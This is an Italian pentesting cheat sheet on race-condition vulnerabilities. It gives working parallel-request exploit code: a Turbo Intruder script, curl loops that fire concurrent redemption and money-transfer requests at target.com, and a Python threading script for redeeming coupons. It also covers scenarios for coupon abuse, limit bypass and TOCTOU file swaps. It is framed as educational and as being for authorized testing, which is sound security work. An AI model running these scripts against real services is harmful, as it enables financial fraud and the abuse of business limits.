# ⚡ Scheda di riferimento sulle race condition

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

> **Nota sugli esempi:** richieste concorrenti non garantiscono una sincronizzazione precisa né dimostrano automaticamente una race condition; bisogna verificare l’effetto sullo stato applicativo. Lo snippet Turbo Intruder è conservato come nell’originale, ma firma del callback e accesso allo stato della risposta vanno verificati con l’API della versione usata. I risultati numerici degli scenari sono illustrativi. Vedi la [guida PortSwigger](https://portswigger.net/web-security/race-conditions).

---

## 🎯 Che cosa sono le race condition

Le **race condition** si verificano quando è possibile sfruttare la temporizzazione delle operazioni, per esempio nelle vulnerabilità tra il controllo e l'uso di una risorsa (check-then-use).

### Impatto
- 💰 **Frode finanziaria** - Utilizzi multipli dello stesso vantaggio
- 🎫 **Abuso di coupon** - Utilizzo ripetuto dello stesso codice
- 👤 **Escalation dei privilegi** - Aggiramento dei controlli
- 📂 **Sovrascrittura di file** - Attacchi TOCTOU

---

## 🔍 Bersagli comuni

```
- Utilizzo di coupon o codici promozionali
- Sistemi di voto o "Mi piace"
- Trasferimenti di denaro
- Operazioni soggette a limiti
- Caricamento di file
- Reimpostazione della password
- Verifica del secondo fattore (2FA)
- Registrazione degli account
```

---

## 💉 Tecniche di sfruttamento

### Burp Suite Turbo Intruder

```python
# Invia la richiesta più volte contemporaneamente
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (manuale)
```
1. Invia la richiesta a Repeater
2. Duplica la scheda più di 20 volte
3. Crea un gruppo di schede
4. Fai clic su "Send group (parallel)"
```

### curl in parallelo
```bash
# Invia 20 richieste in parallelo
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Con dati POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Thread Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Avvia tutti i thread insieme
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Scenari comuni

### Race condition sui codici sconto
```
1. Coupon = sconto del 50%
2. Di norma: utilizzabile una sola volta
3. Race condition: utilizza il coupon 10 volte contemporaneamente
4. Risultato: 10 ordini con uno sconto del 50%
```

### Aggiramento dei limiti
```
1. Limite: 3 download al giorno
2. Race condition: richiedi 10 download contemporaneamente
3. I controlli avvengono contemporaneamente
4. Risultato: tutte le 10 richieste riescono prima dell'applicazione del limite
```

### Race condition nel caricamento di file (TOCTOU)
```
1. Carica il file → viene considerato sicuro dalla validazione
2. Prima dello spostamento, sostituiscilo con un file malevolo
3. Il server sposta il file malevolo al suo posto
```

---

## 🛠 Strumenti

| Strumento | Scopo |
| ------ | --------- |
| **Turbo Intruder** | Estensione Burp per richieste parallele |
| **race-the-web** | Strumento Go per le race condition |
| **racepwn** | Strumento Python per le race condition |

---

## 📚 Risorse

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Verifica i problemi di temporizzazione!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
